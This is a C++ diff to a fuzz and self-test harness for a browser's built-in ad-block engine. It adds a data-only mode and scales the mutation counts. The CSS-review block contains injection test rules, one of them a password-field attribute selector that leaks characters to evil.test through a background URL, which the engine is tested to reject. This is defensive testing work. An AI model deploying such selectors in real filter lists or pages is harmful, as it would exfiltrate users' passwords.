@@ -649,15 +649,20 @@ std::string FullFuzzMutate(std::string_view input, Rng& rng) {
   return base::JoinString(chars, "");
 }
 
-bool RunFullFuzz(base::FilePath input_root, base::FilePath output) {
+bool RunFullFuzz(base::FilePath input_root, base::FilePath output,
+                 bool data_only) {
   if (output.empty() || !base::CreateDirectory(output)) {
     Line("FAIL fuzz-full needs --open-adblock-fuzz-output=<private directory>");
     return false;
   }
   base::ElapsedTimer duration;
+  // Data-only starts at the same printed seed and skips list mutations/URLs.
   Rng rng{kFullFuzzSeed};
+  constexpr uint64_t kDataMutations = 30000;
   FullFuzzInput active(output);
-  Line("fuzz-full seed=0x9e3779b97f4a7c15 watchdog=none load=" + FullFuzzLoad() +
+  Line("fuzz-full seed=0x9e3779b97f4a7c15 mode=" +
+       std::string(data_only ? "data-only" : "full") +
+       " watchdog=none load=" + FullFuzzLoad() +
        " active_input=" + output.AppendASCII("current.input").value());
   Line("fuzz-full counts: list=shim admission (per-rule parse failures are "
        "not exposed); URL=crate Request parse; DAT=deserialize; "
@@ -678,7 +683,8 @@ bool RunFullFuzz(base::FilePath input_root, base::FilePath output) {
   };
   if (!read("easylist.txt", easylist) ||
       !read("easyprivacy.txt", easyprivacy) ||
-      !read("resources.json", resources) || !read("corpus.txt", urls)) {
+      !read("resources.json", resources) ||
+      (!data_only && !read("corpus.txt", urls))) {
     Line("FAIL fuzz-full cannot read pinned seeds");
     return false;
   }
@@ -729,7 +735,7 @@ bool RunFullFuzz(base::FilePath input_root, base::FilePath output) {
   };
 
   FullFuzzCounts lines;
-  for (uint64_t i = 0; i < 150000; ++i) {
+  for (uint64_t i = 0; i < (data_only ? 0u : 150000u); ++i) {
     const std::string text = FullFuzzMutate(line_seeds[rng.Below(line_seeds.size())], rng);
     if (!active.Save("list", i, rng.state, text)) {
       return false;
@@ -738,7 +744,7 @@ bool RunFullFuzz(base::FilePath input_root, base::FilePath output) {
     lines.Record(open_adblock::open_adblock_build_report(*engine).refused.empty());
     if ((i + 1) % 5000 == 0) progress("list", i + 1);
   }
-  lines.Print("list");
+  if (!data_only) lines.Print("list");
 
   // Keep the real two-list engine for URL checks and serialize that engine,
   // rather than mutating the tiny synthetic DAT used by the smoke corpus.
@@ -777,7 +783,7 @@ bool RunFullFuzz(base::FilePath input_root, base::FilePath output) {
 
   FullFuzzCounts requests;
   uint64_t matched = 0;
-  for (uint64_t i = 0; i < 100000; ++i) {
+  for (uint64_t i = 0; i < (data_only ? 0u : 100000u); ++i) {
     const std::string url = FullFuzzMutate(url_seeds[rng.Below(url_seeds.size())], rng);
     const auto type = static_cast<OpenRequestType>(rng.Below(14));
     if (!active.Save("URL", i, rng.state, url,
@@ -793,23 +799,27 @@ bool RunFullFuzz(base::FilePath input_root, base::FilePath output) {
     matched += result.matched;
     if ((i + 1) % 10000 == 0) progress("URL", i + 1);
   }
-  requests.Print("URL");
-  Line("fuzz-full URL matched=" + std::to_string(matched));
+  if (!data_only) {
+    requests.Print("URL");
+    Line("fuzz-full URL matched=" + std::to_string(matched));
+  }
 
   FullFuzzCounts four_byte;
-  const std::vector<uint8_t> magic = {0xd1, 0xd9, 0x3a, 0xaf};
-  if (!active.Save("DAT-4-byte", 0, rng.state,
-                   std::string_view(reinterpret_cast<const char*>(magic.data()), magic.size()))) {
-    return false;
-  }
-  four_byte.Record(Deserialize(magic));
-  four_byte.Print("DAT-4-byte");
-  if (four_byte.accepted) {
-    Line("FAIL fuzz-full four-byte DAT accepted");
-    return false;
+  if (!data_only) {
+    const std::vector<uint8_t> magic = {0xd1, 0xd9, 0x3a, 0xaf};
+    if (!active.Save("DAT-4-byte", 0, rng.state,
+                     std::string_view(reinterpret_cast<const char*>(magic.data()), magic.size()))) {
+      return false;
+    }
+    four_byte.Record(Deserialize(magic));
+    four_byte.Print("DAT-4-byte");
+    if (four_byte.accepted) {
+      Line("FAIL fuzz-full four-byte DAT accepted");
+      return false;
+    }
   }
   FullFuzzCounts dats;
-  for (uint64_t i = 0; i < 3000; ++i) {
+  for (uint64_t i = 0; i < kDataMutations; ++i) {
     std::vector<uint8_t> dat = valid;
     switch (rng.Below(5)) {
       case 0:
@@ -844,7 +854,7 @@ bool RunFullFuzz(base::FilePath input_root, base::FilePath output) {
   dats.Print("DAT-mutation");
 
   FullFuzzCounts resource_inputs;
-  for (uint64_t i = 0; i < 3000; ++i) {
+  for (uint64_t i = 0; i < kDataMutations; ++i) {
     std::string json = FullFuzzMutate(resources, rng);
     if (json.empty()) json = "[";  // Exercise serde_json, not the no-file path.
     if (!active.Save("resources", i, rng.state, json)) {
@@ -857,29 +867,31 @@ bool RunFullFuzz(base::FilePath input_root, base::FilePath output) {
   }
   resource_inputs.Print("resources");
 
-  // Exact review 98-2 injection lines, with two positive selector controls.
-  const std::vector<std::string> css = {
-      "example.com##x{} input[type=password][value^=\"a\"]{background:url(https://evil.test/a)} y",
-      "example.com##.banner:style(background: url(https://evil.test/p.gif) !important)",
-      "example.com##.box:style(color: red } body { background: url(https://evil.test/q) )",
-      "example.com##.plain-ad", "example.com##div[style^=\"z-index: 9;\"]"};
-  if (!active.Save("CSS-review", 0, rng.state, base::JoinString(css, "\n"))) {
-    return false;
-  }
-  auto injected = build(css, {}, "CSS-review", 0);
-  const auto cosmetic = open_adblock::open_adblock_cosmetic(*injected, "https://example.com/");
   FullFuzzCounts css_output;
-  css_output.accepted = cosmetic.hide_selectors.size();
-  css_output.rejected = cosmetic.dropped_unsafe + cosmetic.dropped_style;
-  css_output.Print("CSS-review");
-  bool clean = true;
-  for (const auto& selector : cosmetic.hide_selectors) {
-    clean &= IsCleanSelector(std::string(selector));
-  }
-  if (!clean || css_output.accepted != 2 || cosmetic.dropped_unsafe != 1 ||
-      cosmetic.dropped_style != 2) {
-    Line("FAIL fuzz-full CSS injection crossed the bridge");
-    return false;
+  if (!data_only) {
+    // Exact review 98-2 injection lines, with two positive selector controls.
+    const std::vector<std::string> css = {
+        "example.com##x{} input[type=password][value^=\"a\"]{background:url(https://evil.test/a)} y",
+        "example.com##.banner:style(background: url(https://evil.test/p.gif) !important)",
+        "example.com##.box:style(color: red } body { background: url(https://evil.test/q) )",
+        "example.com##.plain-ad", "example.com##div[style^=\"z-index: 9;\"]"};
+    if (!active.Save("CSS-review", 0, rng.state, base::JoinString(css, "\n"))) {
+      return false;
+    }
+    auto injected = build(css, {}, "CSS-review", 0);
+    const auto cosmetic = open_adblock::open_adblock_cosmetic(*injected, "https://example.com/");
+    css_output.accepted = cosmetic.hide_selectors.size();
+    css_output.rejected = cosmetic.dropped_unsafe + cosmetic.dropped_style;
+    css_output.Print("CSS-review");
+    bool clean = true;
+    for (const auto& selector : cosmetic.hide_selectors) {
+      clean &= IsCleanSelector(std::string(selector));
+    }
+    if (!clean || css_output.accepted != 2 || cosmetic.dropped_unsafe != 1 ||
+        cosmetic.dropped_style != 2) {
+      Line("FAIL fuzz-full CSS injection crossed the bridge");
+      return false;
+    }
   }
 
   task_vm_info_data_t memory{};
@@ -890,9 +902,16 @@ bool RunFullFuzz(base::FilePath input_root, base::FilePath output) {
     Line("FAIL fuzz-full peak phys_footprint unavailable");
     return false;
   }
-  Line("fuzz-full summary PASS seed=0x9e3779b97f4a7c15 lines=150000 urls=100000 "
-       "dat_mutations=3000 resources=3000 dat_4_byte_rejected=1 css_rejected=3 "
-       "css_controls=2 builds=" + std::to_string(builds) +
+  Line("fuzz-full summary PASS seed=0x9e3779b97f4a7c15 mode=" +
+       std::string(data_only ? "data-only" : "full") +
+       " lines=" + std::to_string(lines.accepted + lines.rejected) +
+       " urls=" + std::to_string(requests.accepted + requests.rejected) +
+       " dat_mutations=" + std::to_string(dats.accepted + dats.rejected) +
+       " resources=" + std::to_string(resource_inputs.accepted + resource_inputs.rejected) +
+       " dat_4_byte_rejected=" + std::to_string(four_byte.rejected) +
+       " css_rejected=" + std::to_string(css_output.rejected) +
+       " css_controls=" + std::to_string(css_output.accepted) +
+       " builds=" + std::to_string(builds) +
        " slowest_build_ms=" + std::to_string(slowest_build_ms) +
        " slowest_kind=" + slowest_kind +
        " slowest_index=" + std::to_string(slowest_index) +
@@ -1784,7 +1803,8 @@ void RunOpenAdBlockSelftest(OpenAdBlockService* service,
     base::ThreadPool::PostTaskAndReplyWithResult(
         FROM_HERE, {base::MayBlock(), base::TaskPriority::BEST_EFFORT},
         base::BindOnce(&RunFullFuzz, adblock_root,
-                       command.GetSwitchValuePath("open-adblock-fuzz-output")),
+                       command.GetSwitchValuePath("open-adblock-fuzz-output"),
+                       command.HasSwitch("open-adblock-fuzz-data-only")),
         std::move(done));
     return;
   }
